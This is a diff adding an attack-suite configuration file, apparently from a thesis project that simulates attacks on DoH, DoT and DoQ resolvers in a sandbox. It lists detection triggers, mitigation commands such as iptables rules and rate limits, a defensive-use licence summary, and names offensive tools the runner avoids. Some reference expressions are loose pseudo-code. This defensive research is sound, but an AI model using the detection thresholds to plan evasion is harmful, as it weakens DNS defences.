+    description: "The offered cipher-suite list, or the handshake pattern, is inconsistent with a legitimate client of the target service."
+    owner_file: "src/attacks/cert_injection.py (internal)"
+    reference_expression: "handshake_pattern_valid(offered) == False"
+    reference_table: "Table 23 (p.142) row 2"
+
+  trigger.response_size_anomaly:
+    description: "Response size is anomalously larger than the query size (amplification factor > threshold)."
+    owner_file: "src/attacks/quic_congestion.py (internal)"
+    reference_expression: "response_size > amplification_threshold * query_size"
+    reference_table: "Table 23 (p.142) row 3"
+
+  # --- QHE-layer triggers ---
+
+  trigger.homomorphic_padding_equality:
+    description: "Homomorphic evaluation of ciphertext equality detects that the padding-oracle iteration has produced two distinguishable ciphertexts."
+    owner_file: "configs/qhe_params.yaml §6"
+    reference_expression: "HE.eval(c1 == c2)"
+    reference_table: "Table 18 (p.134) row 5"
+
+  trigger.homomorphic_sni_verification:
+    description: "Homomorphic evaluation of the SNI-certificate-hash relationship detects the injected SNI."
+    owner_file: "configs/qhe_params.yaml §6"
+    reference_expression: "HE.verify(esni, cert_hash) == False"
+    reference_table: "Table 22 (p.141) row 4"
+
+  # --- AMPS-owned triggers ---
+
+  trigger.query_rate_threshold:
+    description: "Query rate exceeds the per-source threshold; source-IP distribution is anomalous."
+    owner_file: "configs/sandbox_mdp_params.yaml §2"
+    reference_expression: "query_rate > per_source_threshold ∨ source_ip_distribution_anomaly"
+    reference_table: "Table 23 (p.142) row 1"
+
+
+# -----------------------------------------------------------------------------
+# 8. Mitigation action registry
+# -----------------------------------------------------------------------------
+# Every mitigation action referenced in §5 is defined here. As with the
+# detection triggers, the mitigation actions are *owned* by the AMPS
+# config (configs/sandbox_mdp_params.yaml §3 and §7); this file only
+# names them and references their owner.
+
+mitigation_actions:
+  # --- DoH ---
+
+  mitigation.sandbox_doh:
+    description: "Route the DoH flow to the sandbox proxy via iptables mangle PREROUTING rule."
+    owner_file: "configs/sandbox_mdp_params.yaml §7"
+    action_key: "isolate_doh_stream"
+    reference_command: "iptables -t mangle -A PREROUTING -j DIVERT_SANDBOX"
+
+  mitigation.terminate_doh_stream:
+    description: "Terminate the active DoH stream."
+    owner_file: "configs/sandbox_mdp_params.yaml §3"
+    action_key: "isolate_doh_stream"
+
+  mitigation.dynamic_frame_policing:
+    description: "Enforce RFC 7540 frame rate limits and priority-tree structure."
+    owner_file: "src/protocols/doh_adapter.py"
+    action_key: "isolate_doh_stream"
+    reference_expression: "enforce_h2_rfc7540() > 5.1"
+
+  mitigation.alternative_routing_and_alert:
+    description: "Route traffic to a backup resolver and alert the certificate authority."
+    owner_file: "src/protocols/doh_adapter.py"
+    action_key: "isolate_doh_stream"
+    reference_expression: "route_to_backup_server(); alert_certificate_authority()"
+
+  mitigation.broadcast_alert_and_rate_limit:
+    description: "Broadcast a federated-learning alert and rate-limit the source IP."
+    owner_file: "configs/fl_dp_params.yaml §8"
+    action_key: "isolate_doh_stream"
+    reference_expression: "broadcast_alert(); limit_rate(src_ip, 5ppm)"
+
+  # --- DoT ---
+
+  mitigation.adaptive_padding_dot:
+    description: "Inject random padding of 100-250 bytes to mask timing variation."
+    owner_file: "configs/sandbox_mdp_params.yaml §7"
+    action_key: "reset_dot_tls"
+    reference_expression: "inject_padding(random.uniform(100, 250))"
+
+  mitigation.tls_state_machine_verification:
+    description: "Enforce TLS 1.3 state-machine compliance and reject renegotiation attempts."
+    owner_file: "src/protocols/dot_adapter.py"
+    action_key: "reset_dot_tls"
+    reference_expression: "assert state ∈ valid_transitions"
+
+  mitigation.ciphertext_rerandomisation:
+    description: "Re-randomise the ciphertext so that the padding-oracle iteration cannot extract information."
+    owner_file: "configs/qhe_params.yaml §3"
+    action_key: "reset_dot_tls"
+    reference_expression: "C' = C ⊕ H(noise || timestamp)"
+
+  # --- DoQ ---
+
+  mitigation.rate_throttle_doq:
+    description: "Throttle the QUIC rate in proportion to the square of the attack ratio."
+    owner_file: "configs/sandbox_mdp_params.yaml §7"
+    action_key: "migrate_doq_connection"
+    reference_expression: "rate_limit = baseline * (1 - attack_ratio^2)"
+
+  mitigation.connection_close_and_log:
+    description: "Close the QUIC connection with error code 0x010C and log the version-downgrade attempt."
+    owner_file: "src/protocols/doq_adapter.py"
+    action_key: "migrate_doq_connection"
+    reference_expression: "send_connection_close(0x010C); log_attack(version_downgrade)"
+
+  # --- Cross-protocol ---
+
+  mitigation.rate_limiting_amps:
+    description: "Rate-limit the source via the AMPS sandbox's rate-limit action."
+    owner_file: "configs/sandbox_mdp_params.yaml §3"
+    action_key: "isolate_<protocol>_<primitive>"
+
+  mitigation.immediate_termination_alert:
+    description: "Immediately terminate the connection and send a TLS alert to the peer."
+    owner_file: "src/protocols/doh_adapter.py"
+    action_key: "isolate_doh_stream"
+    reference_expression: "send_alert(21); close_connection()"
+
+  mitigation.adaptive_thresholding_and_sandbox:
+    description: "Adapt the detection threshold via the online learning rule and route the flow to the sandbox."
+    owner_file: "configs/sandbox_mdp_params.yaml §4"
+    action_key: "isolate_<protocol>_<primitive>"
+    reference_expression: "θ_new = θ_old + η · ∇J(θ); sandbox(flow)"
+
+
+# -----------------------------------------------------------------------------
+# 9. Verification hooks
+# -----------------------------------------------------------------------------
+# The verification script for this file checks three things:
+#   1. Every row in data/attack_matrix.csv has a corresponding entry
+#      in §5, and vice versa (id-set equality).
+#   2. Every `detection_trigger` key referenced in §5 exists in §7, and
+#      every `mitigation_action` key referenced in §5 exists in §8.
+#   3. Every `owner_file` and `owner_keys` reference in §7 and §8
+#      resolves to a file and key that actually exist.
+
+verification:
+  reference_files:
+    - "data/attack_matrix.csv"
+    - "configs/aee_params.yaml"
+    - "configs/qhe_params.yaml"
+    - "configs/fl_dp_params.yaml"
+    - "configs/sandbox_mdp_params.yaml"
+    - "configs/riemannian_metrics.yaml"
+  # Set to true to also verify that each attack module (from §6) can
+  # be imported and that each exposes the `simulate(parameters)` API.
+  # Disabled by default because importing the modules requires the
+  # dependency stack from requirements.txt to be installed.
+  verify_modules_importable: false
+  # Set to true to also verify that the isolation guards of §2 are
+  # actually enforced at runtime. The verification script creates a
+  # namespace, runs the sentinel check, and confirms that the sentinel
+  # is unreachable. Requires `ip netns` and root privileges.
+  verify_isolation_enforced: false
+
+
+# -----------------------------------------------------------------------------
+# 10. Ethical and legal boundary
+# -----------------------------------------------------------------------------
+# The enforceable terms are in the LICENSE file, Defensive-Research
+# Rider. This block is a plain-language restatement for convenience;
+# where the two disagree, the LICENSE governs.
+#
+#   1. Permitted use: defensive research, academic reproducibility,
+#      controlled testing on systems you own or have explicit written
+#      authorization to test.
+#
+#   2. Prohibited use: against systems you do not own or have
+#      authorization to test; to develop offensive tooling; in any
+#      manner that violates applicable law.
+#
+#   3. Isolation must be preserved. The safety guards of §2 enforce
+#      this at load time; a reviewer who disables them assumes full
+#      responsibility for any resulting traffic.
+#
+#   4. Any academic publication using these modules must cite the
+#      thesis (README.md §14).
+
+ethical_boundary:
+  permitted_use: "defensive_research_academic_reproducibility_controlled_testing"
+  prohibited_use: "offensive_tooling_unauthorized_testing_illegal_use"
+  isolation_enforced: true
+  citation_required: true
+  license_reference: "LICENSE (Defensive-Research Rider)"
+
+
+# -----------------------------------------------------------------------------
+# 11. Implementation notes
+# -----------------------------------------------------------------------------
+# A few notes on the implementation of the attack suite that do not fit
+# in any of the sections above.
+
+implementation:
+  # The attack runner (src/attacks/__init__.py) reads this file at
+  # import time and validates it against the JSON schema in
+  # configs/schema.json. A malformed entry is a load-time error, not a
+  # run-time error, so that a misconfiguration is caught before any
+  # traffic is generated.
+
+  # The runner executes scenarios in the order A01..A15. An execution
+  # report is written to outputs/logs/attack_run_<timestamp>.json with,
+  # for each scenario, the target, the rate actually achieved, the
+  # detection trigger that fired, the mitigation action that was
+  # invoked, and the wall-clock duration.
+
+  # The runner does NOT shell out to the reference tools (dns2tcp,
+  # quic-flood, mitmproxy, padbuster, boofuzz, etc.). It re-implements
+  # the injection using the Python libraries listed in requirements.txt
+  # (scapy for packet construction, h2 for HTTP/2, aioquic for QUIC,
+  # dnspython for DNS). This is deliberate: a hermetic simulation is
+  # easier to audit, easier to reproduce, and does not require a
+  # reviewer to install offensive tooling.
+
+  # The runner's output schema is documented in
+  # scripts/reproduce_tables/table_18_attack_mitigation.py (which
+  # consumes the output). Do not change the output schema without
+  # regenerating expected_outputs/table_18_expected.json and
+  # expected_outputs/table_20_expected.json.
+
+  # Seed offset. The attack suite's stochastic elements (random
+  # inter-query delay, chaff GAN sampling, fuzzing mutation rate) all
+  # draw from a single seed derived from runtime.seed + 5. See
+  # default_e3_config.yaml §2 for the run seed.
+  seed_offset: 5
+
+# =============================================================================
+# End of attack_suite_params.yaml
+# =============================================================================
